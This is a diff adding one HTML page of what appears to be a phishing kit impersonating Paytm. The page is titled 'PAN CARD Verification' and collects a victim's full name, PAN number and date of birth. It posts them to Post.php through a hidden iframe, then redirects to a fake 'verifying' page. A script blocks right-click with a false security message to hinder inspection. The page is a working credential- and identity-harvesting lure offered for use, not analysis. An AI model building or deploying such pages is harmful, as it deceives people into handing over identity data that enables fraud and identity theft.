@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <link rel="apple-touch-icon" sizes="180x180" href="/Paytm/apple-touch-icon.png">
+ <link rel="icon" type="image/png" sizes="32x32" href="/Paytm/favicon-32x32.png">
+ <link rel="icon" type="image/png" sizes="16x16" href="/Paytm/favicon-16x16.png">
+ <link rel="manifest" href="/Paytm/site.webmanifest">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>Paytm login - PAN CARD</title>
+  <style>
+    #ml
+    {
+      width:100%;
+    }
+    #kyc
+    {
+       width:80%;
+    }
+    #tp,#pp,#dob
+    {
+    width: 295px;
+    height: 30px;
+    background-color: white;
+    border-color:#01B9F5;
+    color:#404145;
+    font-size: 15px !important;
+    font-weight:bold;
+    padding: 1px 5px;
+    margin-bottom:10px;
+    margin-left:18px;
+    outline: none;
+    background:none;
+    box-shadow: 0px 2px 0px #DADADA;
+    border:none;
+   }
+   #tp:hover
+   {
+   box-shadow: 0px 2px 0px #00B1F1
+   
+   }
+   #dob:hover
+   {
+   box-shadow: 0px 2px 0px #00B1F1
+   
+   }
+   #pp:hover
+   {
+   box-shadow: 0px 2px 0px #00B1F1
+   
+   }
+    #btn
+    {
+    width:120px;
+    background-color:#01B9F5;
+    color: white;
+    border: solid black;
+    margin-left:20px;
+    border-radius: 2px;
+    border-width: 0px;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 15px;
+    height:36px;
+    }
+    #ab
+    {
+    width:365px;
+    margin:50px;
+    border-bottom:solid #E6E6E6;
+    border-width:1.2px;
+    }
+    #dont
+    {
+    width:170px;
+    background-color:white;
+    color: red;
+    border: solid red;
+    margin-left:152px;
+    border-radius: 2px;
+    border-width: 1px;
+    font-weight: bold;
+    font-size: 14px;
+    height:22px;
+    }
+    input::-webkit-input-placeholder {
+    color: #CCCCCC;
+    font-weight:bold;
+    }
+    input:-moz-placeholder {
+    color: #CCCCCC;
+    font-weight:bold;
+    }
+    input::-moz-placeholder {
+    color: #CCCCCC;
+    font-weight:bold;
+    }
+    input:-ms-input-placeholder {
+    color: #CCCCCC;
+    font-weight:bold;
+    }
+    </style>
+    <script language="javascript"> 
+    var message="For security reasons, This function is not allowed here.";
+    function clickIE4(){
+    if (event.button==2){
+    alert(message);
+    return false;
+    }
+    }
+    function clickNS4(e){
+    if (document.layers||document.getElementById&&!document.all){
+    if (e.which==2||e.which==3){
+    alert(message);
+    return false;
+    }
+    }
+    }
+    if (document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;}
+    else if (document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;}
+    document.oncontextmenu=new Function("alert(message);return false;")
+    </script>
+    </head>
+    <body onload="startTimer();">
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='PAN_Verifying.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <img src="ptml.jpg" alt="" id="ml"><br><br>
+    <div>
+    <center>
+    <h3 style="
+    background-color:#DFF6FE;
+    padding: 15px 3px;
+    border-radius:1px;
+    margin:0px;
+    margin-left:-6px;
+    font-size:16px;
+    color:black;
+    width:350px;
+    height:20px;"
+    >PAN CARD Verification</h3></center><br>
+    </div>
+    <b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:20px;">Enter Full Name</b><br>
+    <input type="text" name="Full Name" id="tp" placeholder="Enter Full Name (As Per PAN)"
+    required=""><br>
+    <b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:20px;">Enter PAN Number</b><br>
+    <input type="text"name="PAN No." id="pp" placeholder="Enter PAN Number"
+    pattern="[aA-aZ]{5,}[0-9]{4,}[aA-aZ]{1,}"
+    title="Valid PAN Format Is:ABCDE1234A"
+    required=""><br>
+    <button id="dont" onclick="location.href='Name_And_DOB.html'" type="button">I currently don't have!</button><br>
+    <b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:20px;">Enter Date Of Birth</b>
+    <input type="text" inputmode="numeric" maxlength="10" name="DOB" id="dob" placeholder="DD-MM-YYYY"
+    required=""><br><br>
+    <button type="submit" id="btn" style="font-weight:bold;">Submit</button><br><br><br><br>
+    <!--<b style="color:#01B9F5; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin-left:20px;">Know more about Passcode authentication</span></b><br>
+    <i style="color:grey; font-size:15px; font-weight:bold;margin-left:20px;">Having trouble logging in ?</i>
+     <span style="color: #01B9F5; font-weight:bold;"><i style="font-size:15px; font-weight:bold;">Contact us</i></span>-->
+     <center><img src="BenifitKYC.png" alt="" id="kyc"></center>
+     </form></body></html>
